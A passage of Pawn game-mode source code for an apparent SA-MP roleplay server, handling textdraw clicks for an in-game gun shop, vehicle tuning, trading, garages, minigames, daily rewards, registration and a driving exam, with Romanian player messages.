							PlayerTextDrawSetString(playerid, GunPTD, "ak47~n~~g~$10000");
						}
						case 3: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 349, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "shotgun~n~~g~$6000");
						}
						case 4: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 357, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "rifle~n~~g~$13000");
						}
						case 5: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 353, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "mp5~n~~g~$7500");
						}
					}
				}
				case 1: {
					GunID[playerid] = GunID[playerid]>=5?0:GunID[playerid]+1;
					switch GunID[playerid] do {
						case 0: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 348, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "desert eagle~n~~g~$5000");
						}
						case 1: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 356, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "m4~n~~g~$10000");
						}
						case 2: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 355, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "ak47~n~~g~$10000");
						}
						case 3: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 349, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "shotgun~n~~g~$6000");
						}
						case 4: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 357, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "rifle~n~~g~$13000");
						}
						case 5: {
							DestroyPlayerObject(playerid, GunObject[playerid]);
							GunObject[playerid] = CreatePlayerObject(playerid, 353, 295.33881, -81.58347, 1001.58270,   80.06000, -4.92000, 0.06000, 20.0);
							PlayerTextDrawSetString(playerid, GunPTD, "mp5~n~~g~$7500");
						}
					}					
				}
				case 2: {
					if InInterior[playerid] != BUSINESS_INTERIOR *then
						return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti intr-un business!");

					switch GunID[playerid] do {
						case 0: {
							if(GetPlayerCash(playerid) < 5000)
								return SendClientMessage(playerid, COLOR_WHITE, "Nu ai suficienti bani pentru aceasta arma!");

							ServerWeapon(playerid, 24, 50);
							GivePlayerCash(playerid, -5000);
							BizzInfo[InInteriorID[playerid]][bBalance] += 5000;	
							SendClientMessage(playerid, -1, "Ti-ai cumparat un Desert Eagle in schimb a $5.000.");
						}
						case 1: {
							if(GetPlayerCash(playerid) < 10000)
								return SendClientMessage(playerid, COLOR_WHITE, "Nu ai suficienti bani pentru aceasta arma!");

							ServerWeapon(playerid, 31, 200);
							GivePlayerCash(playerid, -10000);
							BizzInfo[InInteriorID[playerid]][bBalance] += 10000;
							SendClientMessage(playerid, -1, "Ti-ai cumparat un M4 in schimb a $10.000.");
						}
						case 2: {
							if(GetPlayerCash(playerid) < 10000)
								return SendClientMessage(playerid, COLOR_WHITE, "Nu ai suficienti bani pentru aceasta arma!");
							
							ServerWeapon(playerid, 30, 200);
							GivePlayerCash(playerid, -10000);
							BizzInfo[InInteriorID[playerid]][bBalance] += 2000;
							SendClientMessage(playerid, -1, "Ti-ai cumparat un Ak47 in schimb a $10.000.");
						}
						case 3: {
							if(GetPlayerCash(playerid) < 6000)
								return SendClientMessage(playerid, COLOR_WHITE, "Nu ai suficienti bani pentru aceasta arma!");
							
							ServerWeapon(playerid, 25, 60);
							GivePlayerCash(playerid, -6000);
							BizzInfo[InInteriorID[playerid]][bBalance] += 8000;
							SendClientMessage(playerid, -1, "Ti-ai cumparat un Desert Eagle in schimb a $6.000.");
						}
						case 4: {
							if(GetPlayerCash(playerid) < 13000)
								return SendClientMessage(playerid, COLOR_WHITE, "Nu ai suficienti bani pentru aceasta arma!");
							
							ServerWeapon(playerid, 33, 20);
							GivePlayerCash(playerid, -13000);
							BizzInfo[InInteriorID[playerid]][bBalance] += 13000;
							SendClientMessage(playerid, -1, "Ti-ai cumparat un Desert Eagle in schimb a $13.000.");
						}
						case 5: {
							if(GetPlayerCash(playerid) < 7500)
								return SendClientMessage(playerid, COLOR_WHITE, "Nu ai suficienti bani pentru aceasta arma!");
							
							ServerWeapon(playerid, 29, 150);
							GivePlayerCash(playerid, -7500);
							BizzInfo[InInteriorID[playerid]][bBalance] += 7500;
							SendClientMessage(playerid, -1, "Ti-ai cumparat un MP5 in schimb a $7.500.");
						}
					}		
				}
			}
		}
		case 10: {
			switch TextID[Text:clickedid] do {
				case 0: {
				    new idd = FindSpawnID(GetPlayerVehicleID(playerid));
				    if(idd == -1) return true;
				    if(CarInfo[idd][cStage] > 3) return SendClientMessage(playerid, COLOR_LGREEN, "Error: {FFFFFF}Your vehicle has a maximum stage!");
					format(gString, 256, "{FFFFFF}Do you want to update your {4286f4}tuning step {FFFFFF}to {4286f4}%d\n{FFFFFF}The price is {4286f4}%d premium points{FFFFFF}.", CarInfo[idd][cStage]+1, StagePrice[CarInfo[idd][cStage]+1]);
					ShowPlayerDialog(playerid, DIALOG_UPSTAGE, DIALOG_STYLE_MSGBOX, "{4286f4}Tuning {FFFFFF}Upgrade", gString, "Yes", "No");
					return true;					
				}
				case 1: {
					for(new i = 0; i < 2; i++) TextDrawHideForPlayer(playerid, StageTD[i]);
					PlayerTextDrawHide(playerid, StagePTD);
					TogglePlayerControllable(playerid, 1);
					SetCameraBehindPlayer(playerid);	
					player_selected[playerid] = 0;
					CancelSelectTextDraw(playerid);			
				}
			}
		}
		case 14: {
			switch TextID[Text:clickedid] do {
				case 0: if(!TradeReady[playerid]) ShowPlayerDialog(playerid, DIALOG_TRADE, DIALOG_STYLE_LIST, "Trade", "Money (without billions)\nHouse\nBusiness\nVehicle\nCurrent Skin\nHidden Color\nJob\nRare Voucher (50PP)\nEpic Voucher (100PP)\nLegendary Voucher (500 PP)\nMoney (with billions)\nRainbow Ticket\nVip Ticket\nMythic Voucher (250PP)\nMillionaries Voucher (1000PP)\nClan\nMask\nLaser\nMaterials\nPremium Fuel Ticket\nCustom House Ticket", "Ok", "Cancel");	
				case 1: {
					if(TradeItems[playerid] == 0) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Nu ai adaugat nimic in aceasta afacere!");
					if(TradeReady[playerid] == 1) return SendClientMessage(playerid, COLOR_ERROR, "Eroare: {FFFFFF}Nu poti sterge bunurile adaugate in timp ce timer-ul este activat!");
					HideTradeItems(playerid);		
					new id = TradeID[playerid];
					format(gString, 100, "%s si-a sters bunurile adaugate.", GetName(playerid));
					SendClientMessage(playerid, COLOR_GOLD, gString);
					SendClientMessage(id, COLOR_GOLD, gString);	
					return true;	
				}
			}
		}
		case 15: {
			new idd;
			switch TextID[Text:clickedid] do {
				case 0: {
					if(vehicle_in_garage_pos[playerid]<=0) return true;
					vehicle_in_garage_pos[playerid] --;
					idd = vehicle_in_garage[playerid][vehicle_in_garage_pos[playerid]];
					updateTextGarage(playerid, idd);
					Exception[playerid] = 2;
					SetPlayerVirtualWorld(playerid, CarInfo[idd][Spawned]);
					PutPlayerInVehicleEx(playerid, CarInfo[idd][Spawned], 0);
					SetPlayerCameraPos(playerid, 1370.812133, -44.325073, 1002.090270);
					SetPlayerCameraLookAt(playerid, 1373.614868, -40.229263, 1001.482727);
				}
				case 1: {
					if(vehicle_in_garage[playerid][vehicle_in_garage_pos[playerid]+1] == -1) return true;
					vehicle_in_garage_pos[playerid] ++;
					idd = vehicle_in_garage[playerid][vehicle_in_garage_pos[playerid]];
					updateTextGarage(playerid, idd);
					Exception[playerid] = 2;
					SetPlayerVirtualWorld(playerid, CarInfo[idd][Spawned]);
					PutPlayerInVehicleEx(playerid, CarInfo[idd][Spawned], 0);
					SetPlayerCameraPos(playerid, 1370.812133, -44.325073, 1002.090270);
					SetPlayerCameraLookAt(playerid, 1373.614868, -40.229263, 1001.482727);
				}
				case 2: {
					idd = vehicle_in_garage[playerid][vehicle_in_garage_pos[playerid]];
					new g = inGarage[playerid]; inGarage[playerid] = -1;
					for(new t=0;t<5;t++) TextDrawHideForPlayer(playerid, GarageTD[t]);
					PlayerTextDrawHide(playerid, GaragePTD);
					CancelSelectTextDraw(playerid);
					player_selected[playerid] = 0;
					SetCameraBehindPlayer(playerid);
					SetVehicleVirtualWorld(CarInfo[idd][Spawned], 0);
					SetPlayerVirtualWorld(playerid, 0);
					Exception[playerid] = 3;
					SetVehiclePosEx(CarInfo[idd][Spawned], GarageInfo[g][gEnterX], GarageInfo[g][gEnterY], GarageInfo[g][gEnterZ]);
					PutPlayerInVehicleEx(playerid, CarInfo[idd][Spawned], 0);
				}
				case 3: {
					new g = inGarage[playerid]; inGarage[playerid] = -1;
					for(new t=0;t<5;t++) TextDrawHideForPlayer(playerid, GarageTD[t]);
					PlayerTextDrawHide(playerid, GaragePTD);
					CancelSelectTextDraw(playerid);
					player_selected[playerid] = 0;
					SetCameraBehindPlayer(playerid);
					Exception[playerid] = 3;
					SetPlayerPos(playerid, GarageInfo[g][gEnterX], GarageInfo[g][gEnterY], GarageInfo[g][gEnterZ]);
					SetPlayerVirtualWorld(playerid, 0);				
				}
			}
		}
		case 16: {
			switch TextID[Text:clickedid] do {
				case false: {
					if(PlayerInfo[playerid][pShard][listitemmm[playerid]] < 4)
		    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai 4 fragmente din acel tip.");

		    		if(Iter_Count(MyVehicle<playerid>) >= PlayerInfo[playerid][pSlot])
		    			return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai numarul maxim de masinii personale!");

		    		ShowPlayerDialog(playerid, DIALOG_UPGRADESHARD, DIALOG_STYLE_MSGBOX, "Shards", "Esti sigur ca vrei sa faci acest upgrade?\nUpgrade-ul costa 100 puncte premium si sunt sanse de 80%% sa fie cu succes.", "Da", "Nu");
				}
				case true: {
					CancelSelectTextDraw(playerid);
					player_selected[playerid] = 0;
					for(new i=1;i<=4;i++) {
						PlayerTextDrawHide(playerid, ShardPTD[i]);
						TextDrawHideForPlayer(playerid, ShardTD[i-1]);
					}
					PlayerTextDrawHide(playerid, ShardPTD[0]);
				}
			}
		}
		case 17: {
			switch TextID[Text:clickedid] do {
				case false: select_race_map[playerid]=select_race_map[playerid]?select_race_map[playerid]-1:5;
				case true: select_race_map[playerid]=select_race_map[playerid]!=5?select_race_map[playerid]+1:0;
			}
			showRaceInfo(playerid, select_race_map[playerid]);
		}
		case 18: {
			if(DeelayCommand[playerid][28]>gettime())
				return SendClientMessage(playerid, COLOR_WHITE, "{75db3d}(Pizza Job) {FFFFFF}Te rugam sa astepti pana se prepara ingredientele!");

			switch TextID[Text:clickedid] do {
				case 1: {
					if(!pizzaProgress[playerid][3]) return true;
					pizzaProgress[playerid][3] --;
				}
				case 2: {
					if(!pizzaProgress[playerid][0]) return true;
					TextDrawShowForPlayer(playerid, PizzaTD[10]);
					pizzaProgress[playerid][0] --;
				}
				case 3: {
					switch(pizzaProgress[playerid][2]) {
						case 2: TextDrawShowForPlayer(playerid, PizzaTD[7]);
						case 1: TextDrawShowForPlayer(playerid, PizzaTD[8]);
						default: return true;
					}
					pizzaProgress[playerid][2] --;
				}
				case 4: {
					switch(pizzaProgress[playerid][1]) {
						case 2: TextDrawShowForPlayer(playerid, PizzaTD[6]);
						case 1: TextDrawShowForPlayer(playerid, PizzaTD[9]);
						default: return true;
					}
					pizzaProgress[playerid][1] --;
				}
			}
			DeelayCommand[playerid][28] = gettime()+2;
			updatePizzaProgress(playerid);
		}
		case 19: actionBlackjack(playerid, TextID[Text:clickedid]);
		case 20: OnPlayerClickRoulette(playerid, TextID[Text:clickedid]);
		case 24: {
			switch TextID[Text:clickedid] do {
				case 1: {
					if(!player_td_page[playerid]) {
						player_td_page[playerid] = 21;
						gString[0] = EOS;
						format(gString, 128, "%d/22~n~Name: ~b~~h~%s~w~~h~~n~Category: ~b~~h~%s~w~~h~~n~Owned: ~b~~h~%d", player_td_page[playerid]+1, Accessories[player_td_page[playerid]][e_AccessoryName], Accessories[player_td_page[playerid]][e_AccessoryCategory], PlayerInfo[playerid][pAccessories][player_td_page[playerid]]);
						PlayerTextDrawSetString(playerid, AccsPTD[1], gString);
						PlayerTextDrawSetPreviewModel(playerid, AccsPTD[0], Accessories[player_td_page[playerid]][e_Model]);
						PlayerTextDrawSetPreviewRot(playerid, AccsPTD[0], 28.000000, 245.000000, 56.000000, 0.792492);
						PlayerTextDrawShow(playerid, AccsPTD[0]);
						//printf("page: %d %d+1", player_td_page[playerid], player_td_page[playerid]+1);
						if(PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]]) {
							PlayerTextDrawSetString(playerid, AccsPTD[2], "remove it");
							PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0xcc3b31FF);
							PlayerTextDrawShow(playerid, AccsPTD[2]);
						}
						else {
							PlayerTextDrawSetString(playerid, AccsPTD[2], "Put it");
							PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0x3D8517FF);
							PlayerTextDrawShow(playerid, AccsPTD[2]);
						}
						return true;
					}
					player_td_page[playerid]--;
					gString[0] = EOS;
					format(gString, 128, "%d/22~n~Name: ~b~~h~%s~w~~h~~n~Category: ~b~~h~%s~w~~h~~n~Owned: ~b~~h~%d", player_td_page[playerid]+1, Accessories[player_td_page[playerid]][e_AccessoryName], Accessories[player_td_page[playerid]][e_AccessoryCategory], PlayerInfo[playerid][pAccessories][player_td_page[playerid]]);
					PlayerTextDrawSetString(playerid, AccsPTD[1], gString);
					PlayerTextDrawSetPreviewModel(playerid, AccsPTD[0], Accessories[player_td_page[playerid]][e_Model]);
					PlayerTextDrawSetPreviewRot(playerid, AccsPTD[0], 28.000000, 245.000000, 56.000000, 0.792492);
					PlayerTextDrawShow(playerid, AccsPTD[0]);
					//printf("page: %d %d+1", player_td_page[playerid], player_td_page[playerid]+1);
					if(PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]]) {
						PlayerTextDrawSetString(playerid, AccsPTD[2], "remove it");
						PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0xcc3b31FF);
						PlayerTextDrawShow(playerid, AccsPTD[2]);
					}
					else {
						PlayerTextDrawSetString(playerid, AccsPTD[2], "Put it");
						PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0x3D8517FF);
						PlayerTextDrawShow(playerid, AccsPTD[2]);
					}
				}
				case 2: {
					if(player_td_page[playerid]==21) {
						player_td_page[playerid] = 0;
						gString[0] = EOS;
						format(gString, 128, "%d/22~n~Name: ~b~~h~%s~w~~h~~n~Category: ~b~~h~%s~w~~h~~n~Owned: ~b~~h~%d", player_td_page[playerid]+1, Accessories[player_td_page[playerid]][e_AccessoryName], Accessories[player_td_page[playerid]][e_AccessoryCategory], PlayerInfo[playerid][pAccessories][player_td_page[playerid]]);
						PlayerTextDrawSetString(playerid, AccsPTD[1], gString);
						PlayerTextDrawSetPreviewModel(playerid, AccsPTD[0], Accessories[player_td_page[playerid]][e_Model]);
						PlayerTextDrawSetPreviewRot(playerid, AccsPTD[0], 28.000000, 245.000000, 56.000000, 0.792492);
						PlayerTextDrawShow(playerid, AccsPTD[0]);
						if(PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]]) {
							PlayerTextDrawSetString(playerid, AccsPTD[2], "remove it");
							PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0xcc3b31FF);
							PlayerTextDrawShow(playerid, AccsPTD[2]);
						}
						else {
							PlayerTextDrawSetString(playerid, AccsPTD[2], "Put it");
							PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0x3D8517FF);
							PlayerTextDrawShow(playerid, AccsPTD[2]);
						}
						return true;
					}
					player_td_page[playerid]++;
					gString[0] = EOS;
					format(gString, 128, "%d/22~n~Name: ~b~~h~%s~w~~h~~n~Category: ~b~~h~%s~w~~h~~n~Owned: ~b~~h~%d", player_td_page[playerid]+1, Accessories[player_td_page[playerid]][e_AccessoryName], Accessories[player_td_page[playerid]][e_AccessoryCategory], PlayerInfo[playerid][pAccessories][player_td_page[playerid]]);
					PlayerTextDrawSetString(playerid, AccsPTD[1], gString);
					PlayerTextDrawSetPreviewModel(playerid, AccsPTD[0], Accessories[player_td_page[playerid]][e_Model]);
					PlayerTextDrawSetPreviewRot(playerid, AccsPTD[0], 28.000000, 245.000000, 56.000000, 0.792492);
					PlayerTextDrawShow(playerid, AccsPTD[0]);
					if(PlayerInfo[playerid][pAccessoriesOn][player_td_page[playerid]]) {
						PlayerTextDrawSetString(playerid, AccsPTD[2], "remove it");
						PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0xcc3b31FF);
						PlayerTextDrawShow(playerid, AccsPTD[2]);
					}
					else {
						PlayerTextDrawSetString(playerid, AccsPTD[2], "Put it");
						PlayerTextDrawBoxColor(playerid, AccsPTD[2], 0x3D8517FF);
						PlayerTextDrawShow(playerid, AccsPTD[2]);
					}
				}
			}
		}
	}
	return true;
}	

redist::sql_insert_house(playerid) {
	new x = SInterior[playerid]-1, idd = cache_insert_id(), i = sql_houses+1;
	HouseInfo[i][hID] = i;
	HouseInfo[i][hExitx] = InteriorPos[x][0];
	HouseInfo[i][hExity] = InteriorPos[x][1];
	HouseInfo[i][hExitz] = InteriorPos[x][2];
	HouseInfo[i][hEntrancex] = pPos[playerid][0];
	HouseInfo[i][hEntrancey] = pPos[playerid][1];
	HouseInfo[i][hEntrancez] = pPos[playerid][2];
	HouseInfo[i][hLevel] = pNivel[playerid];
	HouseInfo[i][hVirtual] = i;
	HouseInfo[i][hValue] = pPret[playerid];
	HouseInfo[i][hInterior] = GetPlayerInterior(playerid);
	_query("UPDATE `houses` SET `Virtual`='%d', `Exitx` = '%f', `Exity` = '%f', `Exitz` = '%f', `Interior` = '%i' WHERE `ID`='%d'", i, HouseInfo[i][hExitx], HouseInfo[i][hExity], HouseInfo[i][hExitz], HouseInfo[i][hInterior], idd);
	HouseLabel[i] = CreateDynamic3DTextLabel("none", 0xFFFFFF00, HouseInfo[i][hEntrancex], HouseInfo[i][hEntrancey], HouseInfo[i][hEntrancez], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1,-1, -1, 100.0);
	UpdateLabel(1, i);
	SendClientMessage(playerid, COLOR_GOLD, "Casa a fost creata cu succes!");
	SCMf(playerid, COLOR_GOLD, "Informatii: Interior %d, Nivel %d, Pret $%s.", x+1, pNivel[playerid], FormatNumber(HouseInfo[i][hValue]));
	HideShopTDs(playerid);
	sql_houses++;
	return true;
}

redist::ShowCarInfo(playerid, vsid) {
	gString[0] = EOS;
 	format(gString, 528, "{A8C7DE}Vehicle name: %s (%d)\nVehicle price: $%s\nVehicle status: %s\nColors: {%s}%d{A8C7DE}, {%s}%d\n{A8C7DE}Vehicle odometer: %.2f km\nInsurance points: %d/10\nInsurance tax: $%s per point\nDays: %d\nVehicle Speed: %d km/h (+%dkm/h)\nWear: %d km/1000 km\nSpecial Rainbow: %d, %d, %d, %d\nOther details: %s", 
		aVehicleNames[CarInfo[vsid][cModel]-400], CarInfo[vsid][Spawned], FormatNumber(CarInfo[vsid][cValue]), !CarInfo[vsid][cLock] ? ("{47F564}Unlocked{A8C7DE}") : ("{F92E2E}Locked{A8C7DE}"), GetVehicleColors[CarInfo[vsid][cColorOne]], CarInfo[vsid][cColorOne], 
		GetVehicleColors[CarInfo[vsid][cColorTwo]], CarInfo[vsid][cColorTwo], CarInfo[vsid][KM], CarInfo[vsid][cPoints], FormatNumber(CarInfo[vsid][cTax]), CarInfo[vsid][Dayss], GetVehicleMaxSpeed(CarInfo[vsid][cModel]), StageSpeed[CarInfo[vsid][cStage]] + (CarInfo[vsid][cPremium]?(300- GetVehicleMaxSpeed(CarInfo[vsid][cModel])):(0)), 
		CarInfo[vsid][KM], CarInfo[vsid][cRainbows][0], CarInfo[vsid][cRainbows][1], CarInfo[vsid][cRainbows][2], CarInfo[vsid][cRainbows][3], TotalUp(vsid));
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_MSGBOX, "Vehicle info", gString, "Close", "");		
	return true;
}


stock free_skin(playerid) return total_skins(playerid)<(PlayerInfo[playerid][pVip]+1)*10;
//
public OnPlayerClickPlayerTextDraw(playerid, PlayerText:playertextid) {
	if(PlayerTextID[playerid][PlayerText:playertextid] == -1) return true;
	new p=PlayerTextID[playerid][PlayerText:playertextid],string[110], td=-1;
	gString[0] = EOS;
	switch(player_selected[playerid]) {
		case 1: {
			if(strlen(PinInsert[playerid]) == 4) return true;
			if(!strlen(PinInsert[playerid]) && p==9) return SendClientMessage(playerid, COLOR_LGREEN, "(PIN): {FFFFFF}PIN-ul tau nu poate incepe cu cifra 0!");
			PlayerTextDrawColor(playerid, PinPTD[p+1], 0xC1F98FFF);
			PlayerTextDrawShow(playerid, PinPTD[p+1]);
			strcat(PinInsert[playerid], e_Nums[p]);
			PlayerTextDrawSetString(playerid, PinPTD[0], PinInsert[playerid]);
			if(strlen(PinInsert[playerid]) == 4) SendClientMessage(playerid, COLOR_LGREEN, "(PIN): {FFFFFF}Apasa pe butonul deasupra textului '{D7FFB3}ENTER{FFFFFF}' pentru a seta pinul.");
			return true;
		}
		case 2: {
			if(PlayerInfo[playerid][pSkins][p+((td_page[playerid]-1)*10)] == -1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un skin pe acest slot.");
			if(SkinsActions[playerid] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai selectat o actiune!");

			ShowPlayerDialog(playerid, SkinsActions[playerid] == 1 ? DIALOG_SKIN : DIALOG_SKINS, DIALOG_STYLE_MSGBOX,  "My Skins:", SkinsActions[playerid] == 1 ? "Esti sigur ca vrei sa-ti setezi acest skin?" : "Esti sigur ca vrei sa stergi acest skin?",  "Da",  "Nu");
			listitemm[playerid] = p;
			return true;
		}
		case 4: {
			va_SendClientMessage(playerid, 0xc3ff00FF, "Daily Activity: {FFFFFF}Felicitari! Ai ales cadoul cu numar-ul #%d si ai primit:", PlayerTextID[playerid][PlayerText:playertextid]+1);
			for(new i = 9; i < 18; i++) {
				PlayerTextDrawColor(playerid, DailyPTD[playerid][i], 0xFFFFFF50);
				switch(random(100)) {
					case 0..20: {
						if(i==p) {
							SendClientMessage(playerid, 0xc3ff00FF, ">>{FFFFFF} 1x premium points.");
							PlayerInfo[playerid][pPremiumPoints] += 1;
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
							PlayerTextDrawColor(playerid, DailyPTD[playerid][i], COLOR_WHITE);
						}
						PlayerTextDrawSetString(playerid, PlayerTextID[playerid][PlayerText:playertextid], "PP~n~1x");
					}
					case 21..30: {
						if(i==p) {
							SendClientMessage(playerid, 0xc3ff00FF, ">>{FFFFFF} 2x premium points.");
							PlayerInfo[playerid][pPremiumPoints] += 2;
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
							PlayerTextDrawColor(playerid, DailyPTD[playerid][i], COLOR_WHITE);
						}
						PlayerTextDrawSetString(playerid, PlayerTextID[playerid][PlayerText:playertextid], "PP~n~2");
					}
					case 31..40: {
						if(i==p) {
							SendClientMessage(playerid, 0xc3ff00FF, ">> {FFFFFF}100 BPoints.");
							PlayerInfo[playerid][pBPoints] += 100;
							UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
							PlayerTextDrawColor(playerid, PlayerTextID[playerid][PlayerText:playertextid], COLOR_WHITE);
						}
						PlayerTextDrawSetString(playerid, PlayerTextID[playerid][PlayerText:playertextid], "BP~n~100x");
					}
					case 41..45: {
						if(i==p) {
							SendClientMessage(playerid, 0xc3ff00FF, ">>{FFFFFF} 3x premium points.");
							PlayerInfo[playerid][pPremiumPoints] += 3;
							UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
							PlayerTextDrawColor(playerid, DailyPTD[playerid][i], COLOR_WHITE);
						}
						PlayerTextDrawSetString(playerid, PlayerTextID[playerid][PlayerText:playertextid], "PP~n~3"); 
					}
					case 46..50: {
						if(i==p) {
							SendClientMessage(playerid, 0xc3ff00FF, ">> {FFFFFF}300 BPoints.");
							PlayerInfo[playerid][pBPoints] += 300;
							UpdateVar(playerid, "BPoints", PlayerInfo[playerid][pBPoints]);
							PlayerTextDrawColor(playerid, DailyPTD[playerid][i], COLOR_WHITE);
						}
						PlayerTextDrawSetString(playerid, PlayerTextID[playerid][PlayerText:playertextid], "BP~n~300");  
					}
					default: {
						if(i==p) {
							SendClientMessage(playerid, 0xc3ff00FF, ">> {FFFFFF}$69.");
							GivePlayerCash(playerid, 69);
							PlayerTextDrawColor(playerid, DailyPTD[playerid][i], COLOR_WHITE);
						}
						PlayerTextDrawSetString(playerid, PlayerTextID[playerid][PlayerText:playertextid], "Money~n~69$");  
					}
				}
				for(new y = 0; y < 9; y++) PlayerTextDrawShow(playerid, DailyPTD[playerid][y]);
				for(new z = 0; z < 5; z++) TextDrawShowForPlayer(playerid, DailyPTD1[z]);
				PlayerTextDrawShow(playerid, DailyPTD[playerid][i]);
			}
			PlayerInfo[playerid][pDailyActivity] = -1;
			TextDrawSetString(CollectTD[0], "Daily Activity~n~Reward~n~~y~Tomorrow");
			defer HideDaily(playerid);
		}
		case 5: {
			switch(p) {
				case 0: ShowPlayerDialog(playerid, DIALOG_LOGIN1,DIALOG_STYLE_PASSWORD,"SERVER: Register", "Set your password here:","Select","Cancel");
				case 1: ShowPlayerDialog(playerid, DIALOG_REGISTER, DIALOG_STYLE_LIST, "SERVER: Gander", "Male\nFemale", "Select", "Cancel");
				case 2: ShowPlayerDialog(playerid, DIALOG_REGISTER4, DIALOG_STYLE_INPUT, "SERVER: Email", "Set your email here:", "Select", "Cancel");
				case 3: ShowPlayerDialog(playerid, DIALOG_REGISTER5, DIALOG_STYLE_INPUT, "SERVER: Refferal", "Set player referral here:","Select", "Cancel");
				case 4: ShowPlayerDialog(playerid, DIALOG_REGISTER2,DIALOG_STYLE_INPUT,"SERVER: Age","Set your age here:","Select","Cancel");
			}
		}
		case 6: {
			if(p>2) return true;
			if(!examInfo[StepExam[playerid]][e_STATUS][p]) {
				SCMf(playerid, COLOR_WHITE, "{BA0404}Examen: {FFFFFF}Ai picat examenul! (%d/5 intrebari corecte)", StepExam[playerid]);
				StepExam[playerid] = 0;
				SetCameraBehindPlayer(playerid);
				for(new i=0;i<8;i++) TextDrawHideForPlayer(playerid, ExamTD[i]);
				PlayerTextDrawDestroy(playerid, ExamPTD[playerid][0]);
				for(new i=1;i<5;i++) PlayerTextDrawDestroy(playerid, ExamPTD[playerid][i]), PlayerTextID[playerid][PlayerText:ExamPTD[playerid][i]] = -1;
				player_selected[playerid] = 0;
				ExamTime[playerid] = 0;
				CancelSelectTextDraw(playerid);
				InExamen[playerid] = 0;
				return true;
			}
			StepExam[playerid]++;
			if(StepExam[playerid]>=5) {
				SendClientMessage(playerid, COLOR_WHITE, "{00920D}Examen: {FFFFFF}Ai raspuns corect la cele 5 intrebari adresate iar acum ai trecut la ultimul pas. Urmeaza checkpoint-ur");
				SendClientMessage(playerid, COLOR_WHITE, "... le cu atentie si nu avaria vehiculul!");
				StepExam[playerid] = 0;
				InExamen[playerid] = 2;
				ExamTime[playerid] = 0;
				SetCameraBehindPlayer(playerid);
				for(new i=0;i<8;i++) TextDrawHideForPlayer(playerid, ExamTD[i]);
				PlayerTextDrawDestroy(playerid, ExamPTD[playerid][0]);
				for(new i=1;i<5;i++) PlayerTextDrawDestroy(playerid, ExamPTD[playerid][i]), PlayerTextID[playerid][PlayerText:ExamPTD[playerid][i]] = -1;
				player_selected[playerid] = 0;
				CancelSelectTextDraw(playerid);
				SetCameraBehindPlayer(playerid);
				StartDMV(playerid);
				return true;
			}
			updateExam(playerid);
			PlayerTextDrawSetString(playerid, ExamPTD[playerid][0], "~b~00:30");
			ExamTime[playerid] = 30;
			return true;
		}
		case 8: {
			mysql_format(SQL, gQuery, sizeof gQuery, "INSERT INTO houses (`Entrancex`, `Entrancey`, `Entrancez`, `Interior`, `Level`, `Value`) VALUES ('%f', '%f', '%f', '%d', '%d', '%d')",
				pPos[playerid][0], pPos[playerid][1], pPos[playerid][2], GetPlayerInterior(playerid), pNivel[playerid], pPret[playerid]);
			mysql_tquery(SQL, gQuery, #sql_insert_house, #i, playerid);
		}
		case 14: {
			switch(p) {
				case 0: {
					if(TradeAccepted[playerid] == 0) {
						new id = TradeID[playerid];
						switch(TradeReady[playerid]) {
							case 0: {
							    if(TradeItems[playerid] == 0) 
							    	return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa adaugi minim un bun personal!");
								
								if(GetPlayerCash(playerid) < MoneyTrade[playerid]) 
